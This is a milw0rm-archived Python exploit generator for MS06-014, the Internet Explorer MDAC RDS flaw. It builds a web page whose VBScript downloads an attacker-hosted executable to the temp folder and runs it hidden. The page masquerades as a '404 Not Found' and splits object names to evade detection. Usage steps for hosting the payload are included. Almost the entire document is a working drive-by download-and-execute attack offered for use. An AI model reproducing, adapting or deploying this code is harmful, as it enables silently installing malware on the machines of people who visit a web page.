<html><head><title>MS Internet Explorer (MDAC) Remote Code Execution Exploit (MS06-014) </title></head><pre>#!/bin/sh -
&quot;exec&quot; &quot;python&quot; &quot;-O&quot; &quot;$0&quot; &quot;$@&quot;

__doc__ = &quot;&quot;&quot;[BL4CK] - MS06-014

RDS.DataStore - Data Execution
CVS-2006-0003
MS06-014

April 2006

*** this is a bit out-dated, but works very well ***

Usage: ./bl4ck_ms06_014.py http://omfg.what.ho.st/~user/stage2.exe index.html

Now upload index.html to the same webserver hosting your
http://omfg.what.ho.st/~user/stage2.exe 

                            - redsand@blacksecurity.org
&quot;&quot;&quot;

__version__ = &quot;1.0&quot;

import sys, random

class MS06014:
    
    __version = &quot;'[BL4CK] MS06-014 &quot; + __version__ + &quot;\r\n&quot;


    __html = &quot;&quot;&quot;
    &lt;title&gt;&lt;/title&gt;
    &lt;head&gt;&lt;/head&gt;

    &lt;body&gt;

    &lt;script language=&quot;VBScript&quot;&gt;

    on error resume next

    BL4CK_PAYLOAD

    &lt;/script&gt;
    &lt;head&gt;
    &lt;title&gt;[BL4CK] || 404 Not Found&lt;/title&gt;
    &lt;/head&gt;&lt;body&gt;
    &lt;h1&gt;Not Found&lt;/h1&gt;
    pwn3d!!
    &lt;hr&gt;
    &lt;!-- &lt;script&gt;location.href='http://google.com'&lt;/script&gt; --&gt;
    &lt;/body&gt;

    &lt;/html&gt;

    &quot;&quot;&quot;

    __payload = &quot;&quot;&quot;

    ' due to how ajax works, the file MUST be within the same local domain
    dl = &quot;URLFILE&quot;

    ' create adodbstream object
    Set df = document.createElement(&quot;object&quot;)
    df.setAttribute &quot;classid&quot;, &quot;clsid:BD96C556-65A3-11D0-983A-00C04FC29E36&quot;
    str=&quot;Microsoft.XMLHTTP&quot;
    Set x = df.CreateObject(str,&quot;&quot;)

    a1=&quot;Ado&quot;
    a2=&quot;db.&quot;
    a3=&quot;Str&quot;
    a4=&quot;eam&quot;
    str1=a1&amp;a2&amp;a3&amp;a4
    str5=str1
    set S = df.createobject(str5,&quot;&quot;)
    S.type = 1

    ' xml ajax req
    str6=&quot;GET&quot;
    x.Open str6, dl, False
    x.Send

    ' Get temp directory and create our destination name
    fname1=&quot;bl4ck.com&quot;
    set F = df.createobject(&quot;Scripting.FileSystemObject&quot;,&quot;&quot;)
    set tmp = F.GetSpecialFolder(2) ' Get tmp folder
    fname1= F.BuildPath(tmp,fname1)
    S.open
    ' open adodb stream and write contents of request to file
    ' like vbs dl+exec code
    S.write x.responseBody
    ' Saves it with CreateOverwrite flag
    S.savetofile fname1,2

    S.close
    set Q = df.createobject(&quot;Shell.Application&quot;,&quot;&quot;)
    Q.ShellExecute fname1,&quot;&quot;,&quot;&quot;,&quot;open&quot;,0

    &quot;&quot;&quot;

    def	__init__(self, file):

	self.__file = file



    def bl4ck(self):
	self.__payload = self.__payload.replace(&quot;URLFILE&quot;,self.__file)

	encoded = self.__payload

	ret = self.__html.replace(&quot;BL4CK_PAYLOAD&quot;,encoded)

	return ret


if __name__ == '__main__':

	url=False
	out=False

	print &quot;[BL4CK] MS06-014 - redsand@blacksecurity.org&quot;
	print &quot;url path to file must be on the same domain as the htm file&quot;
	print &quot;http://blacksecurity.org\r\n&quot;


	argc = len(sys.argv)
	if(argc &lt;= 2):
        	print &quot;USAGE: %s &lt;download url&gt; &lt;outfile&gt;&quot; % sys.argv[0]
        	sys.exit(0)
	if(argc &gt; 1):
       		url = sys.argv[1]
	if(argc &gt; 2):
        	out = sys.argv[2]

        ms = MS06014(url)

       	ret = ms.bl4ck()


	try:
	    fsock = open(out, &quot;w+&quot;, 0)
	    try:
	        fsock.write(ret );
	    finally:
	        fsock.close()
	except IOError:
	    pass

	print &quot;Wrote %r bytes to: %s&quot; % (len(ret),out)

# milw0rm.com [2006-07-21]</pre></html>